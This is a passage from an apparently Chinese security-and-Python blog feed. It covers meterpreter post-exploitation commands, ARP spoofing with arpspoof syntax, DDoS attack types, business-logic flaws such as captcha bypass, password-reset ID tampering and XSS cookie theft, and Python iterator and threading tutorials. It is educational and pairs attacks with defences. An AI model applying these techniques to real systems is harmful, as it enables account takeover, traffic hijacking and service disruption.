ifconfig<br>查看网卡信息</p></li><li><p>route<br>查看路由信息</p></li><li><p>sysinfo<br>查看系统信息</p></li><li><p>getuid<br>获取当前用户id</p></li><li><p>ps<br>查看进程</p></li><li><p>getpid<br>获取当前进程id</p></li><li><p>migrate<br>切换进程</p></li><li><p>kill<br>终止进程</p></li><li><p>execute<br>执行文件</p></li><li><p>screenshot<br>屏幕截图</p></li><li><p>shutdown<br>关机</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>工具使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具使用</tag>
      
      <tag>渗透测试</tag>
      
      <tag>MSF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python迭代器与生成器</title>
    <link href="/Python%E8%BF%AD%E4%BB%A3%E5%99%A8%E4%B8%8E%E7%94%9F%E6%88%90%E5%99%A8/"/>
    <url>/Python%E8%BF%AD%E4%BB%A3%E5%99%A8%E4%B8%8E%E7%94%9F%E6%88%90%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>用迭代器与生成器创建斐波那契数列</p><a id="more"></a><h1 id="Python迭代器与生成器"><a href="#Python迭代器与生成器" class="headerlink" title="Python迭代器与生成器"></a>Python迭代器与生成器</h1><h2 id="01-迭代器"><a href="#01-迭代器" class="headerlink" title="01 迭代器"></a>01 迭代器</h2><p>python中有些对象是可迭代的，我们可以自己创建迭代器使自定义的类可迭代，从而可以使用for循环输出</p><ol><li><p><strong>for循环实现过程</strong></p><ol><li><p>判断xxx是否可迭代</p></li><li><p>调用iter函数得到xxx对象的iter方法的返回值</p></li><li><p>iter方法的返回值是一个迭代器</p></li><li><p>迭代器中有iter,next就可以使用for循环</p></li><li><p>每次for循环返回next的返回值</p></li></ol></li><li><p><strong>代码示例</strong></p></li></ol>  <pre><code class="hljs python">  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Classmate</span><span class="hljs-params">()</span>:</span>      <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self)</span>:</span>          self.names=list()      <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(self,name)</span>:</span>          self.names.append(name)      <span class="hljs-comment"># 如果想要对象可以迭代，必须使用__iter__方法</span>      <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__iter__</span><span class="hljs-params">(self)</span>:</span>          <span class="hljs-keyword">return</span> Classiterator(self)  <span class="hljs-comment"># 将自身的引用传给迭代器</span>  <span class="hljs-comment"># 迭代器中有__iter__，__next__就可以使用for循环</span>  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Classiterator</span><span class="hljs-params">()</span>:</span>      <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self,class_obj)</span>:</span>          self.iterator_obj=class_obj  <span class="hljs-comment"># 接受类的引用，从而可以使用类中的值</span>          self.current_num=<span class="hljs-number">0</span>  <span class="hljs-comment"># 记录取值的位置</span>      <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__iter__</span><span class="hljs-params">(self)</span>:</span>  <span class="hljs-comment"># 使迭代器成为可迭代的</span>          <span class="hljs-keyword">pass</span>      <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__next__</span><span class="hljs-params">(self)</span>:</span>  <span class="hljs-comment"># 每次for循环时返回next中的返回值</span>          <span class="hljs-keyword">if</span> self.current_num&lt;len(self.iterator_obj.names):              ret = self.iterator_obj.names[self.current_num]              self.current_num+=<span class="hljs-number">1</span>              <span class="hljs-keyword">return</span> ret          <span class="hljs-keyword">else</span>:              <span class="hljs-keyword">raise</span> StopIteration  classmate=Classmate()  classmate.add(<span class="hljs-string">'alex'</span>)  classmate.add(<span class="hljs-string">'brown'</span>)  classmate.add(<span class="hljs-string">'chris'</span>)  <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> classmate:      print(name)            <span class="hljs-comment">#运行结果</span><span class="hljs-string">'''</span><span class="hljs-string">alex</span><span class="hljs-string">brown</span><span class="hljs-string">chris</span><span class="hljs-string">'''</span></code></pre><ul><li>代码中创建了两个类，classmate和它对应的迭代器</li><li>要想使一个类可迭代，就要将其自身的引用传给迭代器</li><li>迭代器通过__init__接收传递的参数</li><li>迭代器中也需要有__iter__使得迭代器可迭代</li><li>使用for循环输出可迭代对象时，每次返回__next__中的返回值</li></ul><p>3.<strong>斐波那契数列迭代器</strong><br>   将类与迭代器整合在了一起</p><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Fibonacci</span><span class="hljs-params">()</span>:</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self,n)</span>:</span>        self.n=n        self.current_num=<span class="hljs-number">0</span>        self.a=<span class="hljs-number">1</span>        self.b=<span class="hljs-number">1</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__iter__</span><span class="hljs-params">(self)</span>:</span>        <span class="hljs-keyword">return</span> self    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__next__</span><span class="hljs-params">(self)</span>:</span>        <span class="hljs-keyword">if</span> self.current_num &lt; self.n:            result = self.a            self.a,self.b=self.b,self.a+self.b            self.current_num+=<span class="hljs-number">1</span>            <span class="hljs-keyword">return</span> result        <span class="hljs-keyword">else</span>:            <span class="hljs-keyword">raise</span> StopIterationfibo=Fibonacci(<span class="hljs-number">10</span>)<span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> fibo:    print(num)    <span class="hljs-comment">#运行结果</span><span class="hljs-string">'''</span><span class="hljs-string">1</span><span class="hljs-string">1</span><span class="hljs-string">2</span><span class="hljs-string">3</span><span class="hljs-string">5</span><span class="hljs-string">8</span><span class="hljs-string">13</span><span class="hljs-string">21</span><span class="hljs-string">34</span><span class="hljs-string">55</span><span class="hljs-string"></span><span class="hljs-string">'''</span></code></pre><h2 id="02-生成器"><a href="#02-生成器" class="headerlink" title="02 生成器"></a>02 生成器</h2><p>生成器是一种特殊的迭代器，使用起来更加简单</p><ol><li><p><strong>简单生成列表与表达式的方法</strong></p> <pre><code class="hljs python">list1=[x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>)]  <span class="hljs-comment"># 生成一个列表</span>gen1=(x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>))  <span class="hljs-comment"># 生成一个生成器</span>print(list1)        <span class="hljs-comment"># 输出列表</span>print(next(gen1))   <span class="hljs-comment"># 输出生成器中下一个元素</span>print(next(gen1))   <span class="hljs-comment"># 输出生成器中下一个元素</span><span class="hljs-comment">#运行结果</span><span class="hljs-string">'''</span><span class="hljs-string">[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]</span><span class="hljs-string">0</span><span class="hljs-string">1</span><span class="hljs-string"></span><span class="hljs-string">'''</span></code></pre></li><li><p><strong>生成器函数</strong><br>只要函数中有yield，它就是一个生成器</p><p>使用生成器输出斐波那契数列</p> <pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_fibo</span><span class="hljs-params">(n)</span>:</span>    i=<span class="hljs-number">0</span>    a, b=<span class="hljs-number">1</span>, <span class="hljs-number">1</span>    <span class="hljs-keyword">while</span> i&lt;n:      <span class="hljs-comment"># 只要有yield就是一个生成器模板，调用函数就是创建生成器</span>        ret = <span class="hljs-keyword">yield</span> a                a, b=b, a+b        i+=<span class="hljs-number">1</span>    <span class="hljs-keyword">return</span> <span class="hljs-string">'ok...'</span>nums=create_fibo(<span class="hljs-number">5</span>)  <span class="hljs-comment"># 可以创建多个生成器，互不影响</span></code></pre></li><li><p><strong>启动生成器的方法</strong></p><ol><li>使用迭代的方法</li></ol><pre><code class="hljs python">print(nums)<span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> nums:print(num) <span class="hljs-comment"># 输出结果</span><span class="hljs-string">'''</span><span class="hljs-string">&lt;generator object create_fibo at 0x10e33d480&gt;</span><span class="hljs-string">1</span><span class="hljs-string">1</span><span class="hljs-string">2</span><span class="hljs-string">3</span><span class="hljs-string">5</span><span class="hljs-string">'''</span></code></pre><ol start="2"><li>使用next</li></ol><pre><code class="hljs python"><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:     <span class="hljs-keyword">try</span>:       result=next(nums)       print(result)            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> result:       print(result.value)       <span class="hljs-keyword">break</span>          <span class="hljs-comment"># 输出结果</span>   <span class="hljs-string">'''</span><span class="hljs-string">   1</span><span class="hljs-string">   1</span><span class="hljs-string">   2</span><span class="hljs-string">   3</span><span class="hljs-string">   5</span><span class="hljs-string">   ok...</span><span class="hljs-string">   '''</span></code></pre><ol start="3"><li><p>使用send<br>注意：多了一行 print(ret)</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_fibo</span><span class="hljs-params">(n)</span>:</span>    i=<span class="hljs-number">0</span>    a, b=<span class="hljs-number">1</span>, <span class="hljs-number">1</span>    <span class="hljs-keyword">while</span> i&lt;n:      <span class="hljs-comment"># 只要有yield就是一个生成器模板，调用函数就是创建生成器</span>        ret = <span class="hljs-keyword">yield</span> a       <span class="hljs-comment"># 输出的ret即为send传递的参数的值  </span>        print(ret)        a, b=b, a+b        i+=<span class="hljs-number">1</span>    <span class="hljs-keyword">return</span> <span class="hljs-string">'ok...'</span>nums=create_fibo(<span class="hljs-number">5</span>)  <span class="hljs-comment"># 可以创建多个生成器，互不影响</span>print(nums.send(<span class="hljs-literal">None</span>))print(<span class="hljs-string">'----------------'</span>)print(nums.send(<span class="hljs-string">'hello'</span>))print(<span class="hljs-string">'----------------'</span>)print(nums.send(<span class="hljs-string">'hi'</span>))print(<span class="hljs-string">'----------------'</span>)<span class="hljs-comment">#输出结果</span><span class="hljs-string">'''</span><span class="hljs-string">1</span><span class="hljs-string">----------------</span><span class="hljs-string">hello</span><span class="hljs-string">1</span><span class="hljs-string">----------------</span><span class="hljs-string">hi</span><span class="hljs-string">2</span><span class="hljs-string">----------------</span><span class="hljs-string">'''</span><span class="hljs-comment"># 1，1，2是yield a的输出结果</span><span class="hljs-comment"># hello，hi是print(ret)的输出结果</span></code></pre></li></ol><ul><li>send可以传递参数，默认为None</li><li>send传递的值相当于传递给了yield a，因此输出的ret的值就是send的参数值</li><li>第一次调用send时，参数必须为None，或者使用next启动</li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ARP欺骗攻防简介</title>
    <link href="/ARP%E6%AC%BA%E9%AA%97%E6%94%BB%E9%98%B2%E7%AE%80%E4%BB%8B/"/>
    <url>/ARP%E6%AC%BA%E9%AA%97%E6%94%BB%E9%98%B2%E7%AE%80%E4%BB%8B/</url>
    
    <content type="html"><![CDATA[<p>ARP协议的原理与中间人攻击</p><a id="more"></a><h1 id="ARP欺骗攻防简介"><a href="#ARP欺骗攻防简介" class="headerlink" title="ARP欺骗攻防简介"></a>ARP欺骗攻防简介</h1><h2 id="01-ARP协议"><a href="#01-ARP协议" class="headerlink" title="01 ARP协议"></a>01 ARP协议</h2><ol><li><p><strong>简介</strong><br>ARP（Address Resolution Protocol）地址解析协议，是根据IP地址获取物理地址的一个TCP/IP协议<br>在OSI模型中，ARP协议属于链路层，在TCP/IP模型中属于网络层</p></li><li><p><strong>工作过程</strong><br>假设主机A要与主机B通信</p><ul><li><p>A与B在同一网段</p><ul><li>A首先判断出目标IP与自己在同一网段</li><li>A首先在自己的ARP缓存中寻找B的IP地址匹配的MAC地址</li><li>如果缓存中没有B的MAC地址，主机A就将发送一个ARP请求广播到网络中全部主机，请求中包含B的IP地址</li><li>所有主机收到ARP请求后就将对比请求中的IP地址与自己的IP地址，如果不同，就丢弃请求，如果相同，就将自己的MAC地址回复给主机A</li><li>主机A收到B发送的MAC地址后就将其储存到ARP缓存中</li></ul></li><li><p>A与B在不同网段</p><ul><li>A首先判断出目标IP与自己在不同网段</li><li>A将发送广播ARP请求获取网关的MAC地址</li><li>网关收到ARP请求后将自己的MAC地址回复给A</li><li>A收到回复后将其储存到ARP缓存中</li><li>A以网关MAC地址为目的地址进行发送数据</li><li>路由器收到数据包后发现目的IP不是自己，之后查询路由表向B转发，如果网关不知道B的MAC地址也要使用ARP协议进行查询</li><li>路由器收到B的MAC地址后，以自己的MAC地址为源地址，以B的MAC地址为目的地址发送数据包</li><li>主机B向A回复的过程与此相同（不需要再次ARP解析了）</li></ul></li><li><p>总结</p><ul><li>ARP请求以广播的方式进行发送</li><li>跨网段通信时需要使用网关作为中介</li></ul></li></ul></li><li><p><strong>Linux中ARP协议的命令</strong></p><ul><li>arp -a/-g<br>查看ARP缓存中所有的条目</li><li>arp -a -i 接口<br>查看该接口的缓存</li><li>arp -s 主机名 物理地址<br>添加一条缓存</li><li>arp -d 主机名<br>删除一条缓存</li></ul></li></ol><h2 id="02-ARP欺骗攻击（ARP毒化）"><a href="#02-ARP欺骗攻击（ARP毒化）" class="headerlink" title="02 ARP欺骗攻击（ARP毒化）"></a>02 ARP欺骗攻击（ARP毒化）</h2><ol><li><p><strong>分类</strong></p><ul><li>主机欺骗，针对单个主机进行欺骗</li><li>网关欺骗，针对网关进行欺骗，可以欺骗所有通过这一网关的主机</li></ul></li><li><p><strong>危害</strong></p><ul><li>使目标主机无法正常上网</li><li>挟持目标主机的流量</li></ul></li><li><p><strong>攻击过程</strong><br>假设主机A（IP：192.168.1.1）与主机B（IP：192.168.1.2）进行通信，攻击者C（IP：192.168.1.3）要进行ARP攻击，攻击过程如下：</p><ul><li>主机A发送ARP请求，询问B的MAC地址</li><li>C收到了ARP请求，但它并没有丢弃，而是假装自己是B，将自己的MAC地址回复给A</li><li>A收到C的回复后，将C的MAC地址与B的IP地址对应起来存入缓存</li><li>C可以以同样的方法对B进行欺骗，就可以进行双向欺骗</li></ul></li><li><p><strong>arp spoof</strong></p><ul><li><p>命令格式<br>arpspoof [-i interface] [-t target] [-r] host</p></li><li><p>参数含义</p><ul><li>-i 指定一个接口</li></ul></li></ul></li></ol><ul><li>-t 指定目标IP，可以指定多个，若不指定则为网段中的全部主机<ul><li>-r 进行双向欺骗</li><li>host 攻击者要仿冒的主机</li></ul></li></ul><ol start="5"><li><strong>防御</strong><ul><li>在主机和网关添加静态ARP记录</li><li>使用ARP防火墙</li></ul></li></ol><h2 id="03-RARP"><a href="#03-RARP" class="headerlink" title="03 RARP"></a>03 RARP</h2><ol><li><p><strong>简介</strong></p><p>RARP（Reverse Address Resolution Protocol）反向地址解析协议，与ARP相反，使用MAC地址获取对应的IP地址<br>RARP请求仍然是广播的形式，但是只有RARP服务才能回复<br>网络中可以有多个RARP服务器，起到平衡负载和备份的作用</p></li><li><p><strong>工作过程</strong></p><ul><li>主机A发送一个RARP广播，包含A自己的MAC地址和目标主机B的MAC地址</li><li>RARP服务器收到此请求后，检查自己的RARP列表，查找该MAC地址对应的IP地址</li><li>如果找到，RARP服务器就回复给主机A</li><li>如果没有找到，RARP服务器就不做任何回应</li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机网络</tag>
      
      <tag>WEB安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DDoS攻防简介</title>
    <link href="/DDoS%E6%94%BB%E9%98%B2%E7%AE%80%E4%BB%8B/"/>
    <url>/DDoS%E6%94%BB%E9%98%B2%E7%AE%80%E4%BB%8B/</url>
    
    <content type="html"><![CDATA[<p>SYN Flood、ACK Flood、CC攻击等</p><a id="more"></a><h1 id="DDoS攻防简介"><a href="#DDoS攻防简介" class="headerlink" title="DDoS攻防简介"></a>DDoS攻防简介</h1><h2 id="01-原理"><a href="#01-原理" class="headerlink" title="01 原理"></a>01 原理</h2><ol><li><p><strong>简介</strong></p><p>DoS（拒绝服务，Denial of Service）就是利用合理的服务请求来占用过多的服务资源，从而使合法用户无法得到服务的响应。这是早期非常基本的网络攻击方式</p><p>DDoS（分布式拒绝服务，Distributed Denial of Service）利用大量主机发送请求进行DoS攻击</p><p>DoS针对的是信息安全三要素（保密性、完整性、可用性）中的可用性</p></li><li><p><strong>分类</strong></p><ul><li>网络层DDoS攻击<br>SYN Flood、UDP Flood、ICMP Flood等，利用了TCP/IP协议的缺陷</li><li>应用层DDoS攻击<br>发生在应用层，TCP三次握手之后，更难以防御</li></ul></li><li><p><strong>危害</strong></p><ul><li>受害主机无法正常与外界通信，无法处理正常请求，严重时系统死机</li><li>用户无法访问网站，无法正常使用网站提供的服务</li></ul></li></ol><h2 id="02-攻击"><a href="#02-攻击" class="headerlink" title="02 攻击"></a>02 攻击</h2><ol><li><p><strong>网络层DDoS攻击</strong></p><ul><li>SYN Flood<br>发生在三次握手的第一次和第二次，攻击者伪造IP发送大量的SYN包，服务器返回ACK/SYN包，但是攻击者并不会回复，服务器就会重试并等待一段时间，最终服务器的资源就被这些半连接耗尽</li><li>ACK Flood<br>发生在TCP连接建立之后，所有TCP报文都带有ACK标志位，服务器收到包后，会检查该数据包所表示的连接四元组是否存在，这一过程会消耗一定的资源，但是负载很小，需要大量的ACK包才能产生效果<br>ACK Flood通常与其它方式组合使用，如SYN Flood</li><li>UDP Flood<br>发生大量伪造IP地址的UDP小包攻击开放UDP服务的端口（如流媒体服务器、DNS服务器等），由于UDP不建立连接，因此无法对源进行检测</li><li>ICMP Flood<br>在短时间内向目的主机发送大量ping包，消耗主机资源</li><li>Connection Flood<br>利用真实的IP地址向服务器发起大量的连接，并且建立连接之后很长时间不释放，占用服务器的资源，造成服务器服务器上残余连接(WAIT状态)过多，类似于固定源IP的SYN Flood攻击</li></ul></li><li><p><strong>应用层DDoS</strong></p><ul><li><p>CC攻击<br>起源于Chanllenge Collapasar<br>原理是对一些资源消耗较大的应用页面不断发起正常的请求（如查询数据库，读写硬盘等），以达到消耗服务器资源的目的</p><p>各类搜索引擎、爬虫等与应用层DDoS攻击的结果很像</p></li><li><p>Slowloris攻击<br>以极低的速度往服务器发送HTTP请求，每隔一段时间就再发送请求使连接保持，使服务器连接数达到上限</p></li><li><p>HTTP POST DoS攻击<br>发送HTTP POST包时，指定一个非常大的Content-Length值，然后以很低的速度发包，保持连接不断开，使服务器连接数达到上限</p></li><li><p>ReDoS<br>当正则表达式写的不好时，就有可能被恶意输入利用，消耗大量资源</p></li><li><p>DNS Flood<br>攻击者使用大量肉鸡同时对目标的域名发送解析请求</p></li></ul></li></ol><h2 id="03-防御"><a href="#03-防御" class="headerlink" title="03 防御"></a>03 防御</h2><ol><li><strong>通用方法</strong><ul><li>识别报文的特征和相似性，使用防火墙对有特征的恶意请求进行拦截</li><li>扩容网站的带宽</li><li>使用CDN，拦截直接对域名的攻击，不要泄露源服务器的IP地址</li><li>备份网站，一旦遭受攻击仍然可以继续使用网站</li></ul></li><li><strong>专用方法</strong><ul><li>SYN Flood<ul><li>缩短SYN timeout时间</li><li>设置SYN cookie，当短时间内连续收到同一个源IP的报文时就将其所有报文都丢弃</li></ul></li><li>ACK Flood<ul><li>通过判断收包是不是异常大于发包来判断攻击是否发生</li><li>建立hash表储存TCP连接状态，加快查询速度</li></ul></li><li>UDP Flood<ul><li>限流，对目的地址进行统计，短时间内到达这一目的地址的流量太高就将其丢弃</li><li>使用防火墙进行UDP指纹识别，丢弃所有具有指纹特征的报文</li></ul></li><li>ICMP Flood<br>禁用ping命令</li><li>Connection Flood<ul><li>限制每个IP的连接数</li><li>封禁恶意连接的IP</li></ul></li><li>CC攻击<ul><li>使用验证码</li><li>让用户解析一段JavaScript并给出运行结果，因为大量伪造的请求是直接构造发送HTTP包，而非使用浏览器发起正常的请求</li><li>Yahoo专利，根据IP和cookie计算访问频率并进行拦截</li></ul></li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机网络</tag>
      
      <tag>WEB安全</tag>
      
      <tag>DoS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>十个常见的业务安全漏洞</title>
    <link href="/%E5%8D%81%E4%B8%AA%E5%B8%B8%E8%A7%81%E7%9A%84%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/"/>
    <url>/%E5%8D%81%E4%B8%AA%E5%B8%B8%E8%A7%81%E7%9A%84%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>验证码、用户登录、注册、密码找回……</p><a id="more"></a><h1 id="十个常见的业务安全漏洞"><a href="#十个常见的业务安全漏洞" class="headerlink" title="十个常见的业务安全漏洞"></a>十个常见的业务安全漏洞</h1><h2 id="00-常见的风险点"><a href="#00-常见的风险点" class="headerlink" title="00 常见的风险点"></a>00 常见的风险点</h2><ol><li>身份验证、cookie、Session、验证码等是否可靠</li><li>用户权限的验证是否可靠</li><li>业务流程是否存在乱序，各个流程之间数据是否一致</li><li>数据的传输与存储是否进行了加密</li><li>参数的输入是否经过检查</li></ol><h2 id="01-验证码"><a href="#01-验证码" class="headerlink" title="01 验证码"></a>01 验证码</h2><ol><li><p>常见验证码有图片验证码、滑动验证码、短信验证、邮箱验证、二维码等</p></li><li><p>不安全的验证码：</p><ul><li>验证码不自动刷新，输入错误一次后仍然有效</li><li>验证码隐藏在源码或者cookie中，可以获取</li><li>验证码数量有限或者太简单</li></ul></li><li><p>绕过方法</p><ul><li>对于验证码只在前端验证，而不在后端进行验证的，可以直接无视验证码，对账号密码进行暴力破解即可</li><li>对于使用token的验证码，如果token在前端可以得到，可以使用burpsuite以递归的方式获取token，之后进行爆破</li><li>使用打码平台</li></ul></li></ol><h2 id="02-用户登录"><a href="#02-用户登录" class="headerlink" title="02 用户登录"></a>02 用户登录</h2><ol><li>撞库登录<ul><li>用户名和密码无错误次数限制<br>使用字典暴力破解</li><li>单段时间内密码错误次数限制<br>可以用来锁定他人账号</li><li>单段时间内IP登录错误次数限制<br>用于封锁IP，可能会锁定同一个出口的所有内网IP</li></ul></li><li>API登录<br>点击一个含有用户ID、Token等信息的URL可以直接登录<br>要确保token不可预测并且经常改变</li></ol><h2 id="03-用户注册"><a href="#03-用户注册" class="headerlink" title="03 用户注册"></a>03 用户注册</h2><ol><li><p>大量垃圾用户注册会造成用户质量下降、刷流量、大量广告等现象</p></li><li><p>用户注册需要注意的安全事项</p><ul><li>使用验证码</li><li>限制统一IP的注册次数</li><li>识别大量格式有规律的账号注册</li><li>防御SQL注入与XSS</li></ul></li></ol><h2 id="04-密码找回"><a href="#04-密码找回" class="headerlink" title="04 密码找回"></a>04 密码找回</h2><ol><li>密码找回常用的验证方法有：邮箱验证码、手机验证码、密保问题等</li><li>可能存在的漏洞<ul><li>提交密码修改请求时可以抓包修改账号对应的手机号和邮箱地址</li><li>生成的验证码和token比较简单，可以预测，甚至在源码中直接可以看到将要发生的验证码</li><li>生成的重置密码的链接存在用户ID与Token，而这个token仅用来验证链接是否有效，并不与用户ID对于，因此修改ID就可以更改其他用户的密码</li><li>修改回显信息的验证，如修改成 true、1、ok、success等</li><li>Session可以被覆盖</li></ul></li><li>防御方法<ul><li>手机号和邮箱地址应该从数据库中读取，而不是直接发送</li><li>设置复杂的验证码和错误次数限制</li><li>将重置密码链接的token与用户ID绑定，而不仅用来验证链接有效性</li></ul></li></ol><h2 id="05-资料查看与修改"><a href="#05-资料查看与修改" class="headerlink" title="05 资料查看与修改"></a>05 资料查看与修改</h2><ol><li>可能存在的漏洞<ul><li>用户可以修改请求中的ID等参数来查看和修改其他用户的信息</li><li>用户修改cookie、get、post等参数的ID，就可以获取另一用户的权限</li></ul></li><li>防御方法<ul><li>将用户信息（如订单等）的ID与所属的用户绑定且不易预测</li><li>将用户ID存储在Session中，避免被修改</li></ul></li></ol><h2 id="06-抽奖与投票"><a href="#06-抽奖与投票" class="headerlink" title="06 抽奖与投票"></a>06 抽奖与投票</h2><ol><li>可能存在的漏洞<br>突破用户可以投票或抽奖的次数限制</li><li>绕过方法<ul><li>删除或修改cookie信息</li><li>伪造IP</li><li>批量注册生成大量用户</li><li>修改cookie中的用户信息，伪装成其他用户</li></ul></li><li>防御方法<ul><li>使用机器识别码进行验证</li><li>用户信息从Session中读取，使用户无法修改</li></ul></li></ol><h2 id="07-充值与支付"><a href="#07-充值与支付" class="headerlink" title="07 充值与支付"></a>07 充值与支付</h2><ol><li>可能存在的漏洞<ul><li>修改金额</li><li>修改时间、数量，突破限购</li><li>修改他人订单信息</li><li>订单重放，实现一次付款多次下单</li></ul></li><li>防御方法<ul><li>对订单变量的取值范围作出限制</li><li>对于数额过大或过小的订单进行人工验证</li><li>使用随机数、时间戳等验证订单的唯一性</li></ul></li></ol><h2 id="08-私信与留言"><a href="#08-私信与留言" class="headerlink" title="08 私信与留言"></a>08 私信与留言</h2><ol><li>可能存在的漏洞<ul><li>通过XSS获取他人的cookie，之后进行登录</li><li>也可能存在SQL注入等</li></ul></li><li>防御方法<br>对用户输入进行过滤，同XSS的防御</li></ol><h2 id="09-远程地址访问"><a href="#09-远程地址访问" class="headerlink" title="09 远程地址访问"></a>09 远程地址访问</h2><ol><li><p>可能存在的漏洞</p><p>如果提供了获取远程地址资源的服务，就可能存在SSRF</p></li><li><p>防御方法</p><p>限制用户输入的地址，同SSRF</p></li></ol><h2 id="10-API"><a href="#10-API" class="headerlink" title="10 API"></a>10 API</h2><ol><li>API(Application Programming Interface,应用程序编程接口)，是为其他程序提供资源调用的接口<br>调用方给API传递一个参数，API根据这个参数将结果以JSON、序列化、Base64等方式返回</li><li>可能存在的漏洞<ul><li>未授权访问</li><li>敏感信息泄露，如在返回信息中包含不必要的用户个人信息</li><li>SQL注入、代码执行等漏洞</li></ul></li><li>防御方法<ul><li>加入账户体系或者不可破解的密钥进行身份验证</li><li>规范返回的信息，不输出不必要的敏感信息</li><li>开发时注意每个参数的使用，避免SQL注入、代码执行等漏洞</li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>业务安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>业务安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python中几个多线程模块</title>
    <link href="/Python%E4%B8%AD%E5%87%A0%E4%B8%AA%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9D%97/"/>
    <url>/Python%E4%B8%AD%E5%87%A0%E4%B8%AA%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9D%97/</url>
    
    <content type="html"><![CDATA[<p>threading、multiprocessing、gevent</p><a id="more"></a><h1 id="Python多线程-进程-协程"><a href="#Python多线程-进程-协程" class="headerlink" title="Python多线程 进程 协程"></a>Python多线程 进程 协程</h1><h2 id="01-threading实现多线程"><a href="#01-threading实现多线程" class="headerlink" title="01 threading实现多线程"></a>01 threading实现多线程</h2><ol><li><p><strong>导入threading模块</strong></p><p>import threading</p></li><li><p><strong>创建对象</strong></p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sing</span><span class="hljs-params">()</span>:</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">5</span>):        print(<span class="hljs-string">"------Singing-----"</span>)        time.sleep(<span class="hljs-number">1</span>)        ts = threading.Thread(target=sing)ts.start()</code></pre><p>注意 target参数只写函数名，不能加括号，此时只创建了对象，没有创建线程<br>ts.start()之后线程开始启动</p><p>运行结果</p><pre><code class="hljs txt">------Singing-----------Singing-----------Singing-----------Singing-----------Singing-----</code></pre></li><li><p><strong>控制子线程</strong></p><pre><code class="hljs python">ts.start()  <span class="hljs-comment"># 启动子线程</span>ts.join([time])  <span class="hljs-comment"># 等待子线程运行完成</span>ts.isAlive()  <span class="hljs-comment"># 返回子线程是否是存活的</span>ts.getName()  <span class="hljs-comment"># 返回子线程名</span>ts.setName()  <span class="hljs-comment"># 设置子线程名</span></code></pre><p>调用start之后才创建了子线程，子线程从start开始执行，目标函数结束后子线程运行结束</p></li><li><p><strong>判断多个子线程运行情况</strong></p><pre><code class="hljs python"><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:  length=len(threading.enumerate())  <span class="hljs-comment"># print("\n当前运行的进程数:%d\n"%length)</span>  time.sleep(<span class="hljs-number">2</span>)  <span class="hljs-keyword">if</span> length &lt;= <span class="hljs-number">1</span>:        print(<span class="hljs-string">"\n所有子线程已运行完成！！！\n"</span>)        <span class="hljs-keyword">break</span></code></pre><p>len(threading.enumerate())表示当前运行的线程数，包括一个主线程</p></li><li><p><strong>通过重载使用多线程</strong></p><pre><code class="hljs python"><span class="hljs-keyword">import</span> threading<span class="hljs-keyword">import</span> time<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyThread</span><span class="hljs-params">(threading.Thread)</span>:</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span><span class="hljs-params">(self)</span>:</span>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>):            time.sleep(<span class="hljs-number">1</span>)            print(<span class="hljs-string">"-----%d-----"</span>%i)        self.relax()    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">relax</span><span class="hljs-params">(self)</span>:</span>        print(<span class="hljs-string">'-----relax-----\n'</span>)<span class="hljs-keyword">if</span> __name__==<span 